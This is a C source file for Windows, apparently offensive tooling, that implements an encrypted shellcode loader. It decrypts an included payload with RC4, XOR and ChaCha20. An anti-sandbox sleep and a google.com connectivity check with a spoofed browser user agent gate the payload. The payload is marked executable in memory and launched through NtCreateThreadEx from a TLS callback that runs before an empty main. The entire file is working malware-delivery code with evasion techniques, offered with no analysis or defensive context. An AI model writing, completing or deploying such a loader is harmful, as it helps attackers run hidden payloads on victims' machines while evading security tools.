#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include <shlwapi.h>
#include <wininet.h>
#include <tchar.h>
#include <string.h>
#include <stdint.h>
#include "enc_shellcode.h"

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Wininet.lib")

// XOR 解密
void xor_crypt(unsigned char *data, unsigned int len, unsigned char key) {
    for (unsigned int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// RC4 解密
void rc4_ksa(unsigned char *state, const unsigned char *key, unsigned int keylen) {
    for (int i = 0; i < 256; i++) state[i] = i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + state[i] + key[i % keylen]) & 0xFF;
        unsigned char tmp = state[i];
        state[i] = state[j];
        state[j] = tmp;
    }
}
void rc4_prga(unsigned char *state, unsigned char *data, unsigned int datalen) {
    int i = 0, j = 0;
    for (unsigned int k = 0; k < datalen; k++) {
        i = (i + 1) & 0xFF;
        j = (j + state[i]) & 0xFF;
        unsigned char tmp = state[i];
        state[i] = state[j];
        state[j] = tmp;
        unsigned char rnd = state[(state[i] + state[j]) & 0xFF];
        data[k] ^= rnd;
    }
}
void rc4_crypt(unsigned char *data, unsigned int len, const unsigned char *key, unsigned int keylen) {
    unsigned char state[256];
    rc4_ksa(state, key, keylen);
    rc4_prga(state, data, len);
}

// ChaCha20 解密
#define ROTL(a,b) (((a) << (b)) | ((a) >> (32 - (b))))
void quarter_round(uint32_t *a, uint32_t *b, uint32_t *c, uint32_t *d) {
    *a += *b; *d ^= *a; *d = ROTL(*d,16);
    *c += *d; *b ^= *c; *b = ROTL(*b,12);
    *a += *b; *d ^= *a; *d = ROTL(*d,8);
    *c += *d; *b ^= *c; *b = ROTL(*b,7);
}
void chacha20_block(uint32_t out[16], const uint32_t in[16]) {
    memcpy(out, in, 64);
    for (int i=0; i<10; i++) {
        quarter_round(&out[0], &out[4], &out[8], &out[12]);
        quarter_round(&out[1], &out[5], &out[9], &out[13]);
        quarter_round(&out[2], &out[6], &out[10], &out[14]);
        quarter_round(&out[3], &out[7], &out[11], &out[15]);
        quarter_round(&out[0], &out[5], &out[10], &out[15]);
        quarter_round(&out[1], &out[6], &out[11], &out[12]);
        quarter_round(&out[2], &out[7], &out[8], &out[13]);
        quarter_round(&out[3], &out[4], &out[9], &out[14]);
    }
    for (int i=0; i<16; i++) out[i] += in[i];
}
void chacha20_crypt(unsigned char *data, unsigned int len, const unsigned char key[32], const unsigned char nonce[12]) {
    uint32_t state[16], block[16];
    unsigned char keystream[64];
    uint32_t counter=0;
    unsigned int offset=0;
    while (len > 0) {
        state[0] = 0x61707865; state[1] = 0x3320646e;
        state[2] = 0x79622d32; state[3] = 0x6b206574;
        for (int i=0; i<8; i++) {
            state[4+i] = ((uint32_t)key[i*4]) | ((uint32_t)key[i*4+1]<<8) |
                         ((uint32_t)key[i*4+2]<<16) | ((uint32_t)key[i*4+3]<<24);
        }
        state[12] = counter++;
        state[13] = ((uint32_t)nonce[0]) | ((uint32_t)nonce[1]<<8) |
                    ((uint32_t)nonce[2]<<16) | ((uint32_t)nonce[3]<<24);
        state[14] = ((uint32_t)nonce[4]) | ((uint32_t)nonce[5]<<8) |
                    ((uint32_t)nonce[6]<<16) | ((uint32_t)nonce[7]<<24);
        state[15] = ((uint32_t)nonce[8]) | ((uint32_t)nonce[9]<<8) |
                    ((uint32_t)nonce[10]<<16) | ((uint32_t)nonce[11]<<24);
        chacha20_block(block, state);
        for (int i=0; i<16; i++) {
            keystream[i*4+0] = (block[i] >> 0) & 0xFF;
            keystream[i*4+1] = (block[i] >> 8) & 0xFF;
            keystream[i*4+2] = (block[i] >> 16) & 0xFF;
            keystream[i*4+3] = (block[i] >> 24) & 0xFF;
        }
        unsigned int blocksize = len > 64 ? 64 : len;
        for (unsigned int i=0; i<blocksize; i++) data[offset+i] ^= keystream[i];
        offset += blocksize; len -= blocksize;
    }
}

// 网络可达性检测（伪装浏览器）
int check_https_connectivity() {
    Sleep(3000);  // 反沙箱延迟
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                                        "(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                                        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 0;

    HINTERNET hConnect = InternetOpenUrlA(hInternet, "https://www.google.com/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\r\n"
        "Host: www.google.com\r\n", -1, INTERNET_FLAG_NO_CACHE_WRITE, 0);

    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 0;
    }

    char buf[1]; DWORD bytesRead;
    BOOL result = InternetReadFile(hConnect, buf, 1, &bytesRead);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return result && bytesRead > 0;
}

void NTAPI tls_callback(PVOID h, DWORD reason, PVOID reserved) {
    if (reason != DLL_PROCESS_ATTACH) return;
    if (!check_https_connectivity()) return;

    // 解密流程：RC4 → XOR → ChaCha20
    rc4_crypt(shellcode, shellcode_len, (unsigned char*)"mysecretkey", strlen("mysecretkey"));
    xor_crypt(shellcode, shellcode_len, 0x5C);
    unsigned char chacha_key[32] = "12345678901234567890123456789012";
    unsigned char chacha_nonce[12] = "123456789012";
    chacha20_crypt(shellcode, shellcode_len, chacha_key, chacha_nonce);

    LPVOID addr = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!addr) ExitProcess(1);

    memcpy(addr, shellcode, shellcode_len);
    DWORD old; VirtualProtect(addr, shellcode_len, PAGE_EXECUTE_READ, &old);

    HANDLE hThread;
    typedef NTSTATUS(WINAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    if (!NtCreateThreadEx) ExitProcess(2);

    if (NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)addr, NULL, 0, 0, 0, 0, NULL) != 0)
        ExitProcess(3);

    if (hThread) CloseHandle(hThread);
    while (1) Sleep(1000);
}

#ifdef _MSC_VER
#pragma comment(linker, "/INCLUDE:__tls_used")
#pragma comment(linker, "/INCLUDE:_tls_callback")
#else
__attribute__((section(".CRT$XLB"))) PIMAGE_TLS_CALLBACK _tls_callback = tls_callback;
#endif

int main() { return 0; }
